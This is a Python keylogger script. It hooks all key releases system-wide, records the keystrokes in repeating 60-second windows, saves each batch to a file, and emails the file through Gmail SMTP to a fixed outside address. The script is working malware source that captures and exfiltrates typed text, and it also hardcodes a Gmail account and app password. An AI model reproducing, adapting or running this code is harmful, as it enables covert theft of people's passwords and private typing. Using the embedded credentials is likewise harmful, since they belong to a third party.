import time
import threading
import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

def start_timer():
    global timer_active
    timer_active = True
    time.sleep(60)
    timer_active = False

def record_key(key):
    global recorded_text
    if timer_active:
        if key.name == "space":
            recorded_text += " "
        elif key.name == "backspace":
            recorded_text = recorded_text[:-1]  # Remove the last character
        else:
            recorded_text += key.name

keyboard.on_release(record_key)

def send_email(output_file):
    # Email configuration
    sender_email = "hirakushiro@gmail.com"  # Your Gmail address
    receiver_email = "tgfmike@gmail.com"   # Receiver's email address
    subject = "Recorded Text File"

    # Set up the MIME
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject

    # Attach the text file
    with open(output_file, "rb") as file:
        attachment = MIMEApplication(file.read(), _subtype="txt")
        attachment.add_header("content-disposition", f"attachment; filename= {output_file}")
        msg.attach(attachment)

    # Send the email using SMTP
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = sender_email
    smtp_password = "rxrwrkoybhldkmgc"  # Use the provided password here

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print("An error occurred while sending the email:", e)

while True:
    recorded_text = ""
    timer_active = False
    
    print("Type within the next 60 seconds to record.")

    # Start the timer in a separate thread
    timer_thread = threading.Thread(target=start_timer)
    timer_thread.start()

    while timer_thread.is_alive():
        time.sleep(1)

    # Save the recorded text to a file
    current_time = time.strftime("%Y-%m-%d_%H-%M-%S")
    output_file = f"output_{current_time}.txt"
    with open(output_file, "w") as file:
        file.write(recorded_text)

    print(f"Recorded text saved to file: {output_file}")

    # Send email with the text file
    send_email(output_file)